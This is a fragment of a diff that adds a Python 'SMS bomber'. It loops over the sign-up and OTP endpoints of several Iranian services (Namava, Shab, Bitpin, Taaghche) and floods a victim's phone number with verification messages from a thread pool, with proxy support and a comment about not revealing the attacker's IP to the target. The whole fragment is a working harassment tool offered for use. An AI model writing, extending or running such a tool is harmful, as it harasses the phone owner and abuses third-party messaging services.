+            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+            "data": {"UserName": f"+98{phone_number[1:]}"},
+        },
+        {
+            "name": "Shab",
+            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
+            "data": {"mobile": phone_number},
+        },
+        {
+            "name": "Bitpin",
+            "url": "https://api.bitpin.org/v2/usr/signin/",
+            "data": {"phone": phone_number},
+        },
+        {
+            "name": "Taaghche",
+            "url": "https://gw.taaghche.com/v4/site/auth/signup",
+            "data": {"contact": phone_number},
+        },
+        # {
+        #     "name": "Digipay",
+        #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
+        #     "data": {"cellNumber": phone_number},
+        # }, # This one will send your IP to your target.
+    ]
+
+    try:
+        with alive_bar(bombing_times * len(apis), theme="smooth") as progress_bar:
+            with concurrent.futures.ThreadPoolExecutor(
+                max_workers=process_num
+            ) as executor:
+                futures = [
+                    executor.submit(process_target, api, proxy_dict)
+                    for api in apis * bombing_times
+                ]
+
+                for future in concurrent.futures.as_completed(futures):
+                    progress_bar()
+                    result = future.result()
+                    if verbose_level:
+                        if "OK" in result:
+                            print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.RED}{result}{Style.RESET_ALL}")
+
+                sleep(1)
+
+        if not verbose_level:
+            results = [future.result() for future in futures]
+            succeeded = [result for result in results if "OK" in result]
+            failed = [result for result in results if "Failed" in result]
+
+            print(
+                f"\nSucceeded: {Fore.GREEN}{len(succeeded)}{Style.RESET_ALL}, "
+                f"Failed: {Fore.RED}{len(failed)}{Style.RESET_ALL}"
+            )
+
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] User interrupted the process.{Style.RESET_ALL}")
+        os._exit(1)
+
+
+if __name__ == "__main__":
+    main()
